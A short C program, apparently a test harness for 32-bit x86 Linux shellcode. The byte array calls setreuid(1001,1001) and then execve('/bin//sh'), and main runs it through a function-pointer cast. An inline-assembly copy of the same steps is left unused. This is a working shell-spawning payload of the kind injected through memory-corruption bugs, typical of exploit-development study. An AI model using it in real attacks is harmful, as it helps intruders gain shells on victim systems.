#include <stdio.h>

char shellcode[] = 
  "\x55"
  "\x89\xe5"

  "\x31\xc0"
  "\x31\xdb"
  "\x31\xc9"
  "\xb0\x46"
  "\x66\xbb\xe9\x03"
  "\x66\xb9\xe9\x03"
  "\xcd\x80"

  "\x31\xc0"
  "\x50"
  "\x68\x2f\x2f\x73\x68"
  "\x68\x2f\x62\x69\x6e"
  "\x89\xe3"
  "\x31\xc9"
  "\x31\xd2"
  "\xb0\x0b"
  "\xcd\x80"
  ;

void call_asm(){
  asm(
      "xor %eax,%eax \n"
      "xor %ebx,%ebx \n"
      "xor %ecx,%ecx \n"
      "mov $0x46,%al \n"
      "mov $0x03E9,%bx \n"
      "mov $0x03E9,%cx \n"      
      "int $0x80 \n"
      
      "xor %eax,%eax \n"
      "push %eax \n"
      "push $0x68732f2f \n"
      "push $0x6e69622f \n"      
      "mov %esp,%ebx \n"
      "xor %ecx,%ecx \n"            
      "xor %edx,%edx \n"      
      "mov $0xb,%al \n"
      "int $0x80 \n"     
      );
}

int main(void) {
  //call_asm();

  (*(void(*)()) shellcode)();

  printf("shellcode fail!\n");

  return 0;
}
